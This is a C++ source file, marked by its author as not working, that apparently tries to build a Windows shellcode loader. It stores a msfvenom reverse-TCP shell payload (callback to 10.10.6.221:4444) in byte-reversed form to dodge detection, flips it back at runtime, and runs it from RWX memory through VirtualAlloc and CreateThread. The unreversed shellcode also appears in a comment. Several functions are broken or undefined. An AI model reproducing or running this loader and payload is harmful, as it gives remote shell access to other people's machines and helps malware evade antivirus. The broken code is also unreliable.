// not working

#include <Windows.h>
#include <iostream>
#include <algorithm>

using namespace std;


void arrRev(char arr1[], int size_of_arr) {
	int i, j;
	char temp;

	j = size_of_arr - 1;

	for (i = 0; i < j; i++, j--) {
		temp = arr1[i];
		arr1[i] = arr1[j];
		arr1[j] = temp;
	}

}

void reverse( s1) {
	int i = 2, lli = s1.length();
	for (; i < lli; i++, lli--)
		swap(s1[i], s1[lli - 1]);	//
	return s1;
}
void hexRev(char arr1[], int size_of_arr) {
	
	const char strmax = sizeof arr1;
	const char* delim = "\\x";
	char* next_token;

	char* token = strtok_s(arr1, delim, &next_token );

	std::vector< int > arr2;

	cout << "\ntraversing through the tokens: " << (char) token << "\n";

	

	while (token != NULL) {
		cout <<"\ntoken" <<  token << "\n";
		arr2.push_back(*token);
		token = strtok_s(NULL, delim, &next_token);
	}

	/*
	for (int i = 0; i < sizeof arr2; i++) {
		cout << "\n arr2 " << i << " : " << arr2[i];
	}
	*/


}

int main() {
	/*
	msfvenom - p windows / shell_reverse_tcp LHOST = 10.10.6.221 LPORT = 4444 - f c
		[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
		[-] No arch selected, selecting arch : x86 from the payload
		No encoder specified, outputting raw payload
		Payload size : 324 bytes
		Final size of c file : 1386 bytes
	*/

	// reversed shellcode
	
	unsigned char buf_rev[] =
		"\xd5\xff\x53\x00\x6a\x6f\x72\x13\x47\xbb\x05\x75\xe0\xfb\x80\x0a\x7c\x06\x3c\xd5\xff\x9d\xbd\x95\xa6\x68\x56\xa2\xb5\xf0\xbb\xd5\xff\x60\x1d\x87\x08\x68\x30\xff\x46\x56\x4e\xe0\x89\xd5\xff\x86\x3f\xcc\x79\x68\x56\x53\x56\x56\x4e\x56\x46\x56\x56\x56\x50\x54\x44\x00\xc6\x10\x24\x44\x8d\x01\x01\x3c\x24\x44\xc7\x66\xfd\xe2\x56\x59\x12\x6a\xf6\x31\x57\x57\x57\xe3\x89\x00\x64\x6d\x63\x68\xd5\xff\x56\xa2\xb5\xf0\x68\xec\x75\x08\x4e\xff\x0c\x74\xc0\x85\xd5\xff\x61\x74\xa5\x99\x68\x57\x56\x10\x6a\xe6\x89\x5c\x11\x00\x02\x68\xdd\x06\x0a\x0a\x68\x05\x6a\x97\xd5\xff\xe0\xdf\x0f\xea\x68\x50\x40\x50\x40\x50\x50\x50\x50\xd5\xff\x00\x6b\x80\x29\x68\x50\x54\xc4\x29\x00\x00\x01\x90\xb8\xd5\xff\x07\x26\x77\x4c\x68\x54\x5f\x32\x73\x77\x68\x00\x00\x32\x33\x68\x5d\x8d\xeb\x12\x8b\x5a\x5f\x5f\xe0\xff\x51\x5a\x59\x61\x5b\x5b\x24\x24\x44\x89\xd0\x01\x8b\x04\x8b\xd3\x01\x1c\x58\x8b\x4b\x0c\x8b\x66\xd3\x01\x24\x58\x8b\x58\xe4\x75\x24\x7d\x3b\xf8\x7d\x03\xf6\x75\xe0\x38\xc7\x01\x0d\xcf\xc1\xac\xff\x31\xd6\x01\x8b\x34\x8b\x49\x3a\xe3\x18\x49\x8b\xd3\x01\x20\x59\x8b\x51\xd1\x01\x48\xe3\x78\x11\x4c\x8b\x3c\x4a\x8b\x10\x52\x8b\x57\x52\xf2\xe2\xc7\x01\x0d\xcf\xc1\x20\x2c\x02\x7c\x61\x3c\xac\xff\x31\x26\x4a\xb7\x0f\x28\x72\x8b\x14\x52\x8b\x0c\x52\x8b\x30\x50\x8b\x64\xc0\x31\xe5\x89\x60\x00\x00\x00\x82\xe8\xfc";
	
	arrRev((char*)buf_rev, sizeof buf_rev);

	hexRev((char*)buf_rev, sizeof buf_rev);

	cout << "\n after hexrev\n";

	sample();

	for (int i = 0; i < sizeof buf_rev; i++) {
		cout << buf_rev[i];
	}

	cout << "\nsizeof buf_rev: " << sizeof buf_rev <<"\n";
	

	/*
	unsigned char buf_rev[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x06\xdd\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
	*/
	for (int i = 0; i < sizeof buf_rev; i++) {
		cout << buf_rev[i];
	}

	//return 0;
	/*
		LPVOID VirtualAlloc(
	  [in, optional] LPVOID lpAddress,
	  [in]           SIZE_T dwSize,
	  [in]           DWORD  flAllocationType,
	  [in]           DWORD  flProtect
	);*/

	cout << "\nsize of buf: " << sizeof buf_rev;

	LPVOID shellcode_exec = VirtualAlloc(0, sizeof buf_rev, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	/*
	   void RtlCopyMemory(
	   void*       Destination,
	   const void* Source,
	   size_t      Length
	);
	*/
	
	RtlCopyMemory(shellcode_exec, buf_rev, sizeof buf_rev);

	//arrRev( (char*)shellcode_exec, sizeof buf);

	DWORD threadId;

	/*
	HANDLE CreateThread(
	[in, optional] LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		[in]            SIZE_T                  dwStackSize,
		[in]            LPTHREAD_START_ROUTINE  lpStartAddress,
		[in, optional]  __drv_aliasesMem LPVOID lpParameter,
		[in]            DWORD                   dwCreationFlags,
		[out, optional] LPDWORD                 lpThreadId
		);
	*/

	cout << "\n" <<shellcode_exec;
	getchar();

	HANDLE hthread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadId);
	WaitForSingleObject(hthread, INFINITE);

	
	return 0;

}